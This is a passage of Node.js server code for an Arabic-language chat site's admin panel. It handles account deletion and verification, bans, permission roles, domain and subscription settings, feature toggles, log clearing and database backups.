                      id: uid.id,
                      uid: uid.id,
                      topic: uid.topic,
                      msg: "(  تم حذف العضوية )",
                      roomid: UserInfo[data.id].idroom,
                      pic: uid.pic,
                    },
                  });
                  UserInfo[uid.id].ismsg = true;
                  io.to(uid.id).emit("msg", {
                    cmd: "ev",
                    data: 'window.onbeforeunload = null; location.href="/";',
                  });
                  UserDisconnect({ id: uid.id, state: 2 });
                }
              }
              setTimeout(function () {
                UsersRepo.delete(req.query["id"]).then((drlg) => {
                  if (drlg) {
                    res.end(
                      JSON.stringify({ err: false, msg: "تم حذف العضوية" })
                    );
                    savestate({
                      state: "حذف عضويه",
                      topic: data.topic,
                      topic1: uid.topic,
                      room: "",
                      ip: data.ip,
                      time: new Date().getTime(),
                    });
                    SubRepo.deleteiduser(req.query["id"]);
                    RefreshUsers();
                  }
                });
              }, 2000);
            } else {
              res.end(
                JSON.stringify({
                  err: true,
                  msg: "لا يمكنك التعديل على من هوا اعلى منك رتبة",
                })
              );
            }
          }
        });
      } else if (req.query.cmd == "documentation") {
        if (!ShowPowers[MyCpA].edituser) {
          res.end(JSON.stringify({ err: true, msg: "لا تملك صلاحية" }));
          return;
        }
        UsersRepo.getById(req.query["id"]).then(function (uid) {
          if (uid) {
            if (VerPower({ to: data.power, me: uid.power })) {
              const dlg = JSON.parse(req.query["documentation"]);

              if (uid.documentationc != dlg.documentation) {
                savestate({
                  state: uid.documentationc
                    ? "إلغاء توثيق عضويه"
                    : "توثيق عضويه",
                  topic: data.topic,
                  topic1: uid.topic,
                  room: "",
                  ip: data.ip,
                  time: new Date().getTime(),
                });
              }

              if (uid.loginG != dlg.loginG) {
                savestate({
                  state: uid.loginG ? "إلغاء العضوية المميزه" : "عضويه مميزه",
                  topic: data.topic,
                  topic1: uid.topic,
                  room: "",
                  ip: data.ip,
                  time: new Date().getTime(),
                });
              }

              if (uid.loginGG != dlg.loginGG) {
                savestate({
                  state: uid.loginGG ? "إلغاء العضوية المميزة" : "عضويه مميزة",
                  topic: data.topic,
                  topic1: uid.topic,
                  room: "",
                  ip: data.ip,
                  time: new Date().getTime(),
                });
              }

              if (uid.loginGG3 != dlg.loginGG3) {
                savestate({
                  state: uid.loginGG3 ? "إلغاء العضوية المميزة" : "عضويه مميزة",
                  topic: data.topic,
                  topic1: uid.topic,
                  room: "",
                  ip: data.ip,
                  time: new Date().getTime(),
                });
              }

              UsersRepo.updateDL({
                documentationc: dlg.documentation,
                loginG: dlg.loginG,
                loginGG: dlg.loginGG,
                loginGG3: dlg.loginGG3,
                id: req.query["id"],
              }).then((drlg) => {
                if (drlg) {
                  if (UserInfo[uid.id]) {
                    if (
                      dlg.documentation == true &&
                      dlg.loginG == false &&
                      dlg.loginGG == false &&
                      dlg.loginGG3 == false
                    ) {
                      io.to(uid.id).emit("msg", {
                        cmd: "alert",
                        data: "تم توثيق عضويتك",
                      });
                    } else if (
                      dlg.loginG == false &&
                      dlg.documentation == true &&
                      dlg.loginGG == false &&
                      dlg.loginGG3 == true
                    ) {
                      io.to(uid.id).emit("msg", {
                        cmd: "alert",
                        data: "تم توثيقك و إعطائك دخول المميز الملكي",
                      });
                    } else if (
                      dlg.loginG == false &&
                      dlg.documentation == false &&
                      dlg.loginGG == false &&
                      dlg.loginGG3 == true
                    ) {
                      io.to(uid.id).emit("msg", {
                        cmd: "alert",
                        data: "تم اعطائك الدخول المميز الملكي",
                      });
                    } else if (
                      dlg.loginG == true &&
                      dlg.documentation == true &&
                      dlg.loginGG == false &&
                      dlg.loginGG3 == false
                    ) {
                      io.to(uid.id).emit("msg", {
                        cmd: "alert",
                        data: "تم توثيقك و إعطائك دخول المميز الشبابي",
                      });
                    } else if (
                      dlg.loginG == true &&
                      dlg.documentation == false &&
                      dlg.loginGG == false &&
                      dlg.loginGG3 == false
                    ) {
                      io.to(uid.id).emit("msg", {
                        cmd: "alert",
                        data: "تم اعطائك الدخول المميز الشبابي",
                      });
                    } else if (
                      dlg.loginG == false &&
                      dlg.loginGG3 == false &&
                      dlg.documentation == true &&
                      dlg.loginGG == true
                    ) {
                      io.to(uid.id).emit("msg", {
                        cmd: "alert",
                        data: "تم توثيقك و إعطائك دخول المميز البناتي",
                      });
                    } else if (
                      dlg.loginGG3 == false &&
                      dlg.loginG == false &&
                      dlg.documentation == false &&
                      dlg.loginGG == true
                    ) {
                      io.to(uid.id).emit("msg", {
                        cmd: "alert",
                        data: "تم اعطائك الدخول المميز البناتي",
                      });
                    }
                  }

                  res.end(
                    JSON.stringify({ err: false, msg: "تم التعديل بنجاح" })
                  );
                }
              });
            } else {
              res.end(
                JSON.stringify({
                  err: true,
                  msg: "لا يمكنك التعديل على من هوا اعلى منك رتبة",
                })
              );
            }
          }
        });
        /*} else if (req.query.cmd == "decoderDans") {
                if (!ShowPowers[MyCpA].ban) {
                    res.end(JSON.stringify({ err: true, msg: "لا تملك صلاحية" }));
                    return;
                }
                BandRepo.getById(req.query["id"]).then((isc) => {
                    if (isc.decoderDans) {
                        res.end(JSON.stringify({ err: false, msg: "تم فك التشفير بنجاح" }));
                        BandRepo.update({ code: stringGen(10), id: req.query["id"], decoderDans: false });
                    } else {
                        res.end(JSON.stringify({ err: false, msg: "تم التشفير بنجاح" }));
                        BandRepo.update({ code: stringGen(10), id: req.query["id"], decoderDans: true });
                    }
                });*/
      } else if (req.query.cmd == "unban") {
        if (!ShowPowers[MyCpA].ban) {
          res.end(JSON.stringify({ err: true, msg: "لا تملك صلاحية" }));
          return;
        }
        BandRepo.getById(req.query["id"]).then((getbn) => {
          if (getbn) {
            savestate({
              state: "فك حظر",
              topic: data.username,
              topic1: getbn.name_band,
              room: getbn.device_band || getbn.ip_band || getbn.country_band,
              ip: data.ip,
              time: new Date().getTime(),
            });
            BandRepo.delete(req.query["id"]).then((delband) => {
              if (delband) {
                res.end(req.query["id"]);
                RefreshBand();
              }
            });
          }
        });
      } else if (req.query.cmd == "delloginDay") {
        if (data.power == "Hide" || data.power == "chatmaster") {
        } else {
          res.end(JSON.stringify({ err: true, msg: "لا تملك صلاحية" }));
          return;
        }
        const logsen = UsersList.filter(function (item) {
          if (item.lastssen) {
            //	  if(Math.ceil(Math.abs(new Date(Number(item.lastssen)) - new Date()) / (1000*60*60*24*3)) >= Number(req.query["d"])){
            if (
              Math.ceil(
                Math.abs(new Date(Number(item.lastssen)) - new Date()) /
                  86400000
              ) >= Number(req.query["d"])
            ) {
              return item;
            }
          }
        });
        if (logsen.length > 0) {
          savestate({
            state: "حذف عضويات",
            topic: data.username,
            topic1: req.query["d"],
            room: "",
            ip: data.ip,
            time: new Date().getTime(),
          });
          res.end(
            JSON.stringify({
              err: false,
              msg:
                "تم حذف العضويات التي لم تسجل دخولها للموقع خلال " +
                req.query["d"] +
                " يوم الماضية",
            })
          );
          for (var i = 0; i < logsen.length; i++) {
            if (logsen[i].power != "Hide" && logsen[i].power != "chatmaster") {
              UsersRepo.delete(logsen[i].idreg).then(function (isdl) {
                if (isdl) {
                }
              });
            }
          }
          RefreshUsers();
        } else {
          res.end(
            JSON.stringify({
              err: false,
              msg: "لا يوجد عضويات لديهم اكثر من " + req.query["d"] + " يوم",
            })
          );
        }
      } else if (req.query.cmd == "ban") {
        if (!ShowPowers[MyCpA].ban) {
          res.end(JSON.stringify({ err: true, msg: "لا تملك صلاحية" }));
          return;
        }
        if (req.query["type"].includes("browser9")) {
          BsbRepo.updateByIdB({ browsers: req.query["type"], id: 1 });
          BrowserOpen = JSON.parse(req.query["type"]);
          res.end(
            JSON.stringify({ system1: SystemOpen, browser1: BrowserOpen })
          );
          savestate({
            state: "تعديل حظر ",
            topic: data.username,
            topic1: "تعديل حظر المتصفحات",
            room: "",
            ip: data.ip,
            time: new Date().getTime(),
          });
        } else if (req.query["type"].includes("system7")) {
          BsbRepo.updateByIdS({ systems: req.query["type"], id: 1 });
          SystemOpen = JSON.parse(req.query["type"]);
          res.end(
            JSON.stringify({ system1: SystemOpen, browser1: BrowserOpen })
          );
          savestate({
            state: "تعديل حظر ",
            topic: data.username,
            topic1: "تعديل حظر الأنظمه",
            room: "",
            ip: data.ip,
            time: new Date().getTime(),
          });
        } else {
          UsersRepo.getByUserName(req.query["type"].trim()).then(function (
            isuer
          ) {
            if (isuer) {
              BandUser({
                country_band: "",
                user: data.username,
                myip: data.ip,
                topic: data.username,
                name_band: "حظر حساب",
                type: "لا يوجد سبب",
                decoderDans: req.query["type"].trim(),
                date: new Date().getTime(),
                ip_band: "",
                device_band: "",
              });

              res.end(
                JSON.stringify({
                  country_band: "",
                  user: data.username,
                  topic: data.username,
                  name_band: "اضافه حظر",
                  type: "لا يوجد سبب",
                  decoderDans: req.query["type"],
                  date: new Date().getTime(),
                  ip_band: "",
                  device_band: "",
                })
              );
            } else if (
              ValidateIPaddress(req.query["type"].trim()) ||
              Number(req.query["type"].trim().replace(".", ""))
            ) {
              BandUser({
                country_band: "",
                user: data.username,
                myip: data.ip,
                topic: data.username,
                name_band: "حظر اي بي",
                type: "لا يوجد سبب",
                decoderDans: "",
                date: new Date().getTime(),
                ip_band: req.query["type"].trim(),
                device_band: "",
              });
              res.end(
                JSON.stringify({
                  country_band: "",
                  user: data.username,
                  topic: data.username,
                  name_band: "حظر اي بي",
                  type: "لا يوجد سبب",
                  decoderDans: "",
                  date: new Date().getTime(),
                  ip_band: req.query["type"],
                  device_band: "",
                })
              );
            } else if (req.query["type"].toUpperCase().trim().length == 2) {
              BandUser({
                country_band: req.query["type"].toUpperCase().trim(),
                user: data.username,
                myip: data.ip,
                topic: data.username,
                name_band: "حظر دولة",
                type: "لا يوجد سبب",
                decoderDans: "",
                date: new Date().getTime(),
                ip_band: "",
                device_band: "",
              });
              res.end(
                JSON.stringify({
                  country_band: req.query["type"].toUpperCase().trim(),
                  user: data.username,
                  topic: data.username,
                  name_band: "حظر دولة",
                  type: "لا يوجد سبب",
                  decoderDans: "",
                  date: new Date().getTime(),
                  ip_band: "",
                  device_band: "",
                })
              );
            } else {
              BandUser({
                country_band: "",
                user: data.username,
                myip: data.ip,
                topic: data.username,
                name_band: "اضافه حظر",
                type: "لا يوجد سبب",
                decoderDans: "",
                date: new Date().getTime(),
                ip_band: "",
                device_band: req.query["type"].trim(),
              });
              res.end(
                JSON.stringify({
                  country_band: "",
                  user: data.username,
                  topic: data.username,
                  name_band: "اضافه حظر",
                  type: "لا يوجد سبب",
                  decoderDans: "",
                  date: new Date().getTime(),
                  ip_band: "",
                  device_band: req.query["type"],
                })
              );
            }
          });
        }
      } else if (req.query.cmd == "bansU") {
        if (!ShowPowers[MyCpA].ban) {
          res.end(JSON.stringify({ err: true, msg: "لا تملك صلاحية" }));
          return;
        }
        BandRepo.getAll().then((isband) => {
          if (isband) {
            res.end(JSON.stringify(isband));
          }
        });
      } else if (req.query.cmd == "bans") {
        if (!ShowPowers[MyCpA].ban) {
          res.end(JSON.stringify({ err: true, msg: "لا تملك صلاحية" }));
          return;
        }
        res.end(JSON.stringify({ system1: SystemOpen, browser1: BrowserOpen }));
      } else if (req.query.cmd == "powers_del") {
        if (!ShowPowers[MyCpA].setpower) {
          res.end(JSON.stringify({ err: true, msg: "لا تملك صلاحية" }));
          return;
        }

        if (req.query["name"] == "chatmaster" || req.query["name"] == "Hide") {
          res.end(
            JSON.stringify({ err: true, msg: "لا يمكنك حذف هذه لصلاحية" })
          );
        }
        if (req.query["name"] != "") {
          if (VerPower({ to: data.power, me: req.query["name"] })) {
            const indexpd = ShowPowers.findIndex(
              (x) => x.name == req.query["name"]
            );
            if (indexpd !== -1) {
              ShowPowers.splice(indexpd, 1);
              io.emit("msg", { cmd: "powers", data: ShowPowers });
              UsersRepo.getAll().then((upw) => {
                if (upw) {
                  for (var i = 0; i < upw.length; i++) {
                    if (upw[i].power == req.query["name"]) {
                      UsersRepo.updatePower({ power: "", idreg: upw[i].idreg });
                    }
                  }
                }
              });
              PowersRepo.updatePower({
                power: JSON.stringify(ShowPowers),
                id: 1,
              }).then((delp) => {
                if (delp) {
                  res.end(
                    JSON.stringify({ err: false, msg: "تم حذف الصلاحية" })
                  );
                  savestate({
                    state: "حذف صلاحية",
                    topic: data.topic,
                    topic1: data.topic,
                    room: req.query["name"],
                    ip: data.ip,
                    time: new Date().getTime(),
                  });
                }
              });
            }
          } else {
            res.end(
              JSON.stringify({
                err: false,
                msg: "لا يمكنك التعدل على هذه الصلاحية",
              })
            );
          }
        } else {
          res.end(
            JSON.stringify({ err: true, msg: "لا يمكنك حذف هذه الصلاحية" })
          );
        }
      } else if (req.query.cmd == "powers_save") {
        // if (data.power == "admin" || data.power == "Hide" || data.power == "chatmaster") {
        if (MyOptionDone(data.power) >= 50) {
          if (req.query["name"] != "") {
            if (!ShowPowers[MyCpA].setpower) {
              res.end(JSON.stringify({ err: true, msg: "لا تملك صلاحية" }));
              return;
            }

            if (Config.maxPower <= ShowPowers.length) {
              socket.emit("msg", {
                cmd: "not",
                data: {
                  topic: "",
                  force: 1,
                  msg: "تم إنشاء الحد الاقصى من الصلاحيات",
                  user: "",
                },
              });
              return;
            }
            if (!isNaN(JSON.parse(req.query["power"]).name)) {
              res.end(
                JSON.stringify({
                  err: false,
                  msg: "الرجاء التاكد من اسم الصلاحية",
                })
              );
              return;
            }
            if (
              JSON.parse(req.query["power"]).name.trim() &&
              JSON.parse(req.query["power"]).rank
            ) {
              const isname = ShowPowers.findIndex(
                (x) => x.name == JSON.parse(req.query["power"]).name
              );
              if (isname == -1) {
                const isdonepa = ShowPowers.findIndex(
                  (x) => x.name == data.power
                );
                if (
                  JSON.parse(req.query["power"]).rank >
                  ShowPowers[isdonepa].rank
                ) {
                  res.end(
                    JSON.stringify({
                      err: false,
                      msg: "لا يمكنك انشاء صلاحية اعلى منك",
                    })
                  );
                  return;
                }
                ShowPowers.push(JSON.parse(req.query["power"]));
                io.emit("msg", { cmd: "powers", data: ShowPowers });
                PowersRepo.updatePower({
                  power: JSON.stringify(ShowPowers),
                  id: 1,
                }).then((dp) => {
                  if (dp) {
                    res.end(
                      JSON.stringify({ err: false, msg: "تم إنشاء صلاحية" })
                    );
                    savestate({
                      state: "إنشاء صلاحية",
                      topic: data.topic,
                      topic1: data.topic,
                      room: JSON.parse(req.query["power"]).name,
                      ip: data.ip,
                      time: new Date().getTime(),
                    });
                  }
                });
                return;
              }

              if (
                VerPower({
                  to: data.power,
                  me: JSON.parse(req.query["power"]).name,
                })
              ) {
                const indexpd = ShowPowers.findIndex(
                  (x) => x.name == JSON.parse(req.query["power"]).name
                );
                const indexme = ShowPowers.findIndex(
                  (x) => x.name == data.power
                );

                if (indexpd != -1 && indexme != -1) {
                  if (
                    JSON.parse(req.query["power"]).rank >
                    ShowPowers[indexme].rank
                  ) {
                    res.end(JSON.stringify({ err: true, msg: "noRank" }));
                    return;
                  }
                  ShowPowers.splice(indexpd, 1);
                  ShowPowers.push(JSON.parse(req.query["power"]));
                  io.emit("msg", { cmd: "powers", data: ShowPowers });
                  PowersRepo.updatePower({
                    power: JSON.stringify(ShowPowers),
                    id: 1,
                  }).then((delp) => {
                    if (delp) {
                      res.end(
                        JSON.stringify({
                          err: false,
                          msg: "تم تعديل المجموعة ",
                        })
                      );
                      savestate({
                        state: "تعديل مجموعة ",
                        topic: data.topic,
                        topic1: data.topic,
                        room: JSON.parse(req.query["power"]).name,
                        ip: data.ip,
                        time: new Date().getTime(),
                      });
                    }
                  });
                }
              } else {
                res.end(JSON.stringify({ err: true, msg: "noRank" }));
              }
            } else {
              res.end(
                JSON.stringify({
                  err: false,
                  msg: "الرجاء التاكد من  الصلاحية",
                })
              );
            }
          } else {
            res.end(
              JSON.stringify({
                err: false,
                msg: "لا يمكنك التعدل على هذه الصلاحية",
              })
            );
          }
        } else {
          res.end(JSON.stringify({ err: true, msg: "لا تملك صلاحية" }));
        }
      } else if (req.query.cmd == "sico") {
        res.end(JSON.stringify(sicos));
      } else if (req.query.cmd == "powers") {
        if (ShowPowers[MyCpA].setpower) {
          res.end(JSON.stringify(ShowPowers));
        } else {
          res.end(JSON.stringify({ err: true, msg: "لا تمتلك صلاحيات" }));
        }
      } else if (req.query.cmd == "IsStartap") {
        if (ShowPowers[MyCpA].setpower) {
          res.end(JSON.stringify({ msg: true }));
        } else {
          res.end(JSON.stringify({ msg: false }));
        }
      } else if (req.query.cmd == "IsStarta") {
        if (ShowPowers[MyCpA].owner) {
          res.end(JSON.stringify({ msg: true }));
        } else {
          res.end(JSON.stringify({ msg: false }));
        }
      } else if (req.query.cmd == "IsStart") {
        if (data.power == "chatmaster" || data.power == "Hide") {
          res.end(JSON.stringify({ msg: true }));
        } else {
          res.end(JSON.stringify({ msg: false }));
        }
      } else if (req.query.cmd == "socketIo") {
        if (data.power == "chatmaster" || data.power == "Hide") {
          savestate({
            state: "إعادة تشغيل",
            topic: data.username,
            topic1: data.topic,
            room: "",
            ip: data.ip,
            time: new Date().getTime(),
          });
          setTimeout(function () {
            process.exit(1);
          }, 1000);
        } else {
          res.end(JSON.stringify({ err: true, msg: "لا تملك صلاحية" }));
        }
      } else if (req.query.cmd == "removedmoin") {
        if (data.power == "Hide") {
          if (req.query["event"] == 1) {
            res.end(
              JSON.stringify({ err: true, data: "لا يمكنك حذف الدومين الاصلي" })
            );
            return;
          }
          HostRepo.delete(req.query["event"]).then((resdone) => {
            if (resdone) {
              SettingRepo.delete(req.query["event"]);
              SiteRepo.delete(req.query["event"]);
              RefreshHostList();
              res.end(JSON.stringify({ err: false, data: "تم مسح الدومين" }));
            }
          });
        } else {
          res.end(JSON.stringify({ err: true, data: "ليس لديك صلاحية" }));
        }
      } else if (req.query.cmd == "tfinish") {
        if (data.power == "Hide") {
          OwnerRepo.updateTF({ time: req.query["event"], id: 1 });
          res.end(JSON.stringify({ err: false, data: "تم تعديل الاشتراك" }));
          OwnerList();
        } else {
          res.end(JSON.stringify({ err: true, data: "ليس لديك صلاحية" }));
        }
      } else if (req.query.cmd == "adddmoin") {
        if (data.power == "Hide") {
          SettingRepo.create({
            site: JSON.stringify({
              allowg: true,
              allowreg: true,
              background: Config.ColorBackground,
              bg: Config.ColorBG,
              buttons: Config.ColorButton,
              code: 8747,
              fileslikes: 90000,
              id: 1,
              msgst: 5,
              notlikes: 7000,
              pmlikes: 2000,
              miclikes: 5000,
              name: "",
              siteScript: "",
              title: Config.Title,
              sitedescription: Config.Description,
              sitekeywords: Config.Keywords,
              bclikes: Config.LikeBc,
              walllikes: JSON.stringify({
                lengthMsgBc: 250,
                lengthMsgPm: 250,
                lengthMsgRoom: 250,
                lengthUserG: 100,
                lengthUserReg: 100,
                likeMsgRoom: 8,
                likeTopicEdit: 100,
                likeUpImgBc: 500,
                likeUpPic: 10,
              }),
              wallminutes: 0,
            }),
            dro3: "",
            sico: "",
            emo: "",
          }).then(function (isdtm) {
            HostRepo.create({
              hostname: req.query["event"],
              setting: isdtm.id,
            });
            SiteRepo.create({ host: req.query["event"], ids: isdtm.id });
            RefreshHostList();
            res.end(JSON.stringify({ err: false, data: "تم إظافة دومين" }));
          });
        } else {
          res.end(JSON.stringify({ err: true, data: "ليس لديك صلاحية" }));
        }
      } else if (req.query.cmd == "addtv") {
        if (data.power == "chatmaster" || data.power == "Hide") {
          OwnerRepo.updateTv({ Tv: req.query["event"], id: 1 });
          OwnerList();
          IsTV = req.query["event"];
          io.emit("msg", { cmd: "IsTv", data: req.query["event"] });
          res.end(JSON.stringify({ err: false, data: "تم إظافة راديو" }));
        }
      } else if (req.query.cmd == "addrep") {
        if (data.power == "chatmaster" || data.power == "Hide") {
          if (req.query["event"] > 3 && req.query["event"] < 100) {
            OwnerRepo.updateMaxRep({ max: req.query["event"], id: 1 });
            OwnerList();
            MaxRep = req.query["event"];
            io.emit("msg", { cmd: "Maxrep", data: req.query["event"] });
            res.end(JSON.stringify({ err: false, data: "تم التعديل بنجاح" }));
          } else {
            res.end(
              JSON.stringify({
                err: false,
                data: "يجب ان يكون الرقم بين 3 و  100",
              })
            );
          }
        }
      } else if (req.query.cmd == "delfpc") {
        if (req.query["event"] == "vpns") {
          if (!ShowPowers[MyCpA].ban) {
            res.end(JSON.stringify({ err: false, data: "لا تملك صلاحية" }));
            return;
          }
          OwnerRepo.getById(1).then((isfd) => {
            if (isfd) {
              if (isfd.Vpn) {
                OwnerRepo.updateVPN({ vpn: false, id: 1 });
                OwnerList();
                savestate({
                  state: "VPN الغاء حظر ",
                  topic: data.username,
                  topic1: data.topic,
                  room: "",
                  ip: data.ip,
                  time: new Date().getTime(),
                });
                isVPN = false;
              } else {
                OwnerRepo.updateVPN({ vpn: true, id: 1 });
                OwnerList();
                savestate({
                  state: "VPN تفعيل حظر ",
                  topic: data.username,
                  topic1: data.topic,
                  room: "",
                  ip: data.ip,
                  time: new Date().getTime(),
                });
                isVPN = true;
              }
              res.end(JSON.stringify({ err: false, data: "" }));
            }
          });
        }
        if (data.power == "chatmaster" || data.power == "Hide") {
          if (req.query["event"] == "fps") {
            LogsRepo.deleteall().then((isdf) => {
              if (isdf) {
                res.end(
                  JSON.stringify({
                    err: false,
                    data: "تم مسح جميع سجلات الدخول",
                  })
                );
                savestate({
                  state: "حذف سجل الدخول",
                  topic: data.username,
                  topic1: data.topic,
                  room: "",
                  ip: data.ip,
                  time: new Date().getTime(),
                });
              }
            });
          } else if (req.query["event"] == "mbnr") {
            OwnerRepo.getById(1).then((isfd) => {
              if (isfd) {
                if (isfd.isbanner) {
                  OwnerRepo.updateBann({ bnr: false, id: 1 });
                  OwnerList();
                  savestate({
                    state: "ايقاف البنر",
                    topic: data.username,
                    topic1: data.topic,
                    room: "",
                    ip: data.ip,
                    time: new Date().getTime(),
                  });
                  isbannerdone = false;
                } else {
                  OwnerRepo.updateBann({ bnr: true, id: 1 });
                  OwnerList();
                  savestate({
                    state: "تفعيل البنر",
                    topic: data.username,
                    topic1: data.topic,
                    room: "",
                    ip: data.ip,
                    time: new Date().getTime(),
                  });
                  isbannerdone = true;
                }
                res.end(JSON.stringify({ err: false, data: "" }));
              }
            });
          } else if (req.query["event"] == "mbnr1") {
            OwnerRepo.getById(1).then((isfd) => {
              if (isfd) {
                if (isfd.isbanner1) {
                  OwnerRepo.updateBann1({ bnr1: false, id: 1 });
                  OwnerList();
                  savestate({
                    state: "تفعيل تنظيف العام",
                    topic: data.username,
                    topic1: data.topic,
                    room: "",
                    ip: data.ip,
                    time: new Date().getTime(),
                  });
                  isbannerdone1 = false;
                } else {
                  OwnerRepo.updateBann1({ bnr1: true, id: 1 });
                  OwnerList();
                  savestate({
                    state: " ايقاف تنظيف العام",
                    topic: data.username,
                    topic1: data.topic,
                    room: "",
                    ip: data.ip,
                    time: new Date().getTime(),
                  });
                  isbannerdone1 = true;
                }
                res.end(JSON.stringify({ err: false, data: "" }));
              }
            });
          } else if (req.query["event"] == "mbnr2") {
            OwnerRepo.getById(1).then((isfd) => {
              if (isfd) {
                if (isfd.isbanner2) {
                  OwnerRepo.updateBann2({ bnr2: false, id: 1 });
                  OwnerList();
                  savestate({
                    state: "تفعيل مشاهدين البروفايل",
                    topic: data.username,
                    topic1: data.topic,
                    room: "",
                    ip: data.ip,
                    time: new Date().getTime(),
                  });
                  isbannerdone2 = false;
                } else {
                  OwnerRepo.updateBann2({ bnr2: true, id: 1 });
                  OwnerList();
                  savestate({
                    state: " ايقاف مشاهدين البروفايل",
                    topic: data.username,
                    topic1: data.topic,
                    room: "",
                    ip: data.ip,
                    time: new Date().getTime(),
                  });
                  isbannerdone2 = true;
                }
                res.end(JSON.stringify({ err: false, data: "" }));
              }
            });
          } else if (req.query["event"] == "mbnr3") {
            OwnerRepo.getById(1).then((isfd) => {
              if (isfd) {
                if (isfd.isbanner3) {
                  OwnerRepo.updateBann3({ bnr3: false, id: 1 });
                  OwnerList();
                  savestate({
                    state: "تفعيل ارسال الوسائط ",
                    topic: data.username,
                    topic1: data.topic,
                    room: "",
                    ip: data.ip,
                    time: new Date().getTime(),
                  });
                  isbannerdone3 = false;
                } else {
                  OwnerRepo.updateBann3({ bnr3: true, id: 1 });
                  OwnerList();
                  savestate({
                    state: " ايقاف ارسال الوسائط  ",
                    topic: data.username,
                    topic1: data.topic,
                    room: "",
                    ip: data.ip,
                    time: new Date().getTime(),
                  });
                  isbannerdone3 = true;
                }
                res.end(JSON.stringify({ err: false, data: "" }));
              }
            });
          } else if (req.query["event"] == "mbnr4") {
            OwnerRepo.getById(1).then((isfd) => {
              if (isfd) {
                if (isfd.isbanner2) {
                  OwnerRepo.updateBann4({ bnr4: false, id: 1 });
                  OwnerList();
                  savestate({
                    state: "ردود العام",
                    topic: data.username,
                    topic1: data.topic,
                    room: "",
                    ip: data.ip,
                    time: new Date().getTime(),
                  });
                  isbannerdone4 = false;
                } else {
                  OwnerRepo.updateBann4({ bnr4: true, id: 1 });
                  OwnerList();
                  savestate({
                    state: " ردود العام",
                    topic: data.username,
                    topic1: data.topic,
                    room: "",
                    ip: data.ip,
                    time: new Date().getTime(),
                  });
                  isbannerdone4 = true;
                }
                res.end(JSON.stringify({ err: false, data: "" }));
              }
            });
          } else if (req.query["event"] == "rc") {
            OwnerRepo.getById(1).then((isfd) => {
              if (isfd) {
                if (isfd.rc) {
                  OwnerRepo.updateRc({ rc: false, id: 1 });
                  OwnerList();
                  savestate({
                    state: "ايقاف إعادة الاتصال",
                    topic: data.username,
                    topic1: data.topic,
                    room: "",
                    ip: data.ip,
                    time: new Date().getTime(),
                  });
                  isrc = false;
                } else {
                  OwnerRepo.updateRc({ rc: true, id: 1 });
                  OwnerList();
                  savestate({
                    state: "تفعيل إعادة الاتصال",
                    topic: data.username,
                    topic1: data.topic,
                    room: "",
                    ip: data.ip,
                    time: new Date().getTime(),
                  });
                  isrc = true;
                }
                res.end(JSON.stringify({ err: false, data: "" }));
              }
            });
          } else if (req.query["event"] == "names") {
            NamesRepo.deleteall().then((isdf) => {
              if (isdf) {
                res.end(
                  JSON.stringify({ err: false, data: "تم مسح سجل كشف الاسماء" })
                );
                savestate({
                  state: "حذف كشف الاسماء",
                  topic: data.username,
                  topic1: data.topic,
                  room: "",
                  ip: data.ip,
                  time: new Date().getTime(),
                });
              }
            });
          } else if (req.query["event"] == "filter") {
            HistLetterRepo.deleteall().then((isdf) => {
              if (isdf) {
                res.end(
                  JSON.stringify({ err: false, data: "تم مسح جميع الفيلتر" })
                );
                savestate({
                  state: "حذف الفيلتر",
                  topic: data.username,
                  topic1: data.topic,
                  room: "",
                  ip: data.ip,
                  time: new Date().getTime(),
                });
              }
            });
          } else if (req.query["event"] == "filesClear") {
            rimraf("uploads/sendfile", () => {
              res.end(
                JSON.stringify({
                  err: false,
                  data: "تم حذف جميع ملفات الخاص و الحائط",
                })
              );
              savestate({
                state: "حذف ملفات الحائط و الخاص",
                topic: data.username,
                topic1: data.topic,
                room: "",
                ip: data.ip,
                time: new Date().getTime(),
              });
              if (!fs.existsSync("uploads/sendfile")) {
                fs.mkdirSync("uploads/sendfile");
              }
            });
          } else if (req.query["event"] == "import") {
            fs.existsSync("database/database0.sql")
              ? (fs.unlink("database/database.sql", (cesia) => {
                  cesia &&
                    res.end(
                      JSON.stringify({
                        err: false,
                        data: "فشل تركيب النسخة الاحطياطية",
                      })
                    );
                }),
                fs.rename(
                  "database/database0.sql",
                  "database/database.sql",
                  (finnick) => {
                    finnick
                      ? res.end(
                          JSON.stringify({
                            err: false,
                            data: "فشل تركيب النسخة الاحطياطية",
                          })
                        )
                      : res.end(
                          JSON.stringify({
                            err: false,
                            data: "تم تركيب النسخة الاحطياطية",
                          })
                        );
                  }
                ))
              : res.end(
                  JSON.stringify({ err: false, data: "ليس هناك نسخة إحطياطية" })
                );
          } else if (req.query.event == "backup") {
            fs.copyFile(
              "database/database.sql",
              "database/database0.sql",
              (laiza) => {
                laiza
                  ? res.end(
                      JSON.stringify({
                        err: false,
                        data: "فشل إنشاء نسخة إحطياطية",
                      })
                    )
                  : res.end(
                      JSON.stringify({
                        err: false,
                        data: "تم إنشاء نسخة إحطياطية",
                      })
                    );
              }
            );
          } else if (req.query["event"] == "fixuser") {
            OwnerRepo.getById(1).then((isfd) => {
              if (isfd) {
                if (isfd.offline) {
                  OwnerRepo.updateOff({ offline: false, id: 1 });
                  OwnerList();
                  savestate({
                    state: "الغاء تثبيت العضويات",
                    topic: data.username,
                    topic1: data.topic,
                    room: "",
                    ip: data.ip,
                    time: new Date().getTime(),
                  });
                  Offline = false;
                } else {
                  OwnerRepo.updateOff({ offline: true, id: 1 });
                  OwnerList();
                  savestate({
                    state: "تثبيت العضويات",
                    topic: data.username,
                    topic1: data.topic,
                    room: "",
                    ip: data.ip,
                    time: new Date().getTime(),
                  });
                  Offline = true;
                }
                res.end(JSON.stringify({ err: false, data: "" }));
              }
            });
          } else if (req.query["event"] == "ficbar") {
            OwnerRepo.getById(1).then((isfd) => {
              if (isfd) {
                if (isfd.bars) {
                  OwnerRepo.update({ bars: false, id: 1 });
                  OwnerList();
                  savestate({
                    state: "الغاء تثبيت الحائط",
                    topic: data.username,
                    topic1: data.topic,
                    room: "",
                    ip: data.ip,
                    time: new Date().getTime(),
                  });
                  BarFix = false;
                } else {
                  OwnerRepo.update({ bars: true, id: 1 });
                  OwnerList();
                  savestate({
                    state: "تثبيت الحائط",
                    topic: data.username,
                    topic1: data.topic,
                    room: "",
                    ip: data.ip,
                    time: new Date().getTime(),
                  });
                  BarFix = true;
                }
                res.end(JSON.stringify({ err: false, data: "" }));
              }
            });
          } else if (req.query["event"] == "bars") {
            BarsRepo.deleteall().then((isdf) => {
              if (isdf) {
                res.end(JSON.stringify({ err: false, data: "تم مسح الحائط" }));
                io.emit("msg", { cmd: "fildel", data: {} });
                savestate({
                  state: "حذف الحائط",
                  topic: data.username,
                  topic1: data.topic,
